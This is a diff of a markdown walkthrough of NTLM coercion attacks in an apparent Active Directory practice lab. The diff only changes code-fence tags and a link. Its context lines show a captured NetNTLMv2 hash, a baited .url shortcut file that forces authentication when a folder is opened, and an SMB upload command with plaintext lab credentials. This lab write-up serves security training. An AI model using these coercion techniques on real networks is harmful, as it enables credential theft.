@@ -49,7 +49,7 @@ Once the user access the share we get the users hash through Responder.
 
 ![screenshot_5.png](./images/screenshot_5.png)
 
-```javascript
+```
 catelyn.stark::NORTH:19d99c632a805889:0A6C8691396FE9B6A3AD3B5B3B378671:0101000000000000807C08D0D26CDA0113EF01224A1B3CFE000000000200080036005A005300590001001E00570049004E002D004200560032003900370035003100460036005700510004003400570049004E002D00420056003200390037003500310046003600570051002E0036005A00530059002E004C004F00430041004C000300140036005A00530059002E004C004F00430041004C000500140036005A00530059002E004C004F00430041004C0007000800807C08D0D26CDA010600040002000000080030003000000000000000010000000020000014D15C2C005F5BBD167168BE6315E609F4B52B5F2604A44EB5ECB51FFF2D5E5E0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0031000000000000000000
 ```
 
@@ -72,7 +72,7 @@ The previous attack can also be achieved using .scf. The proccess is exactly the
 
 Now, this Coerce attack is by using .url files. Let’s start by creating a file called **`salaryFiles.url`** , it’s good to use creative names, even tho for this attack to work, the users doesn’t need to click/open the file, the user just need to access the folder were the file is.
 
-```javascript
+```
 [InternetShortcut]
 URL=http://hr.company.com/pwned
 WorkingDirectory=test
@@ -82,7 +82,7 @@ IconIndex=1
 
 The next step it to upload this file to the share we do have Write permission, in our case it the share **`all`**. we can use smblient.py to upload the file.
 
-`[smbclient.py](http://smbclient.py/)`` north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local`
+`smbclient.py north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local`
 
 ![screenshot_6.png](./images/screenshot_6.png)
 
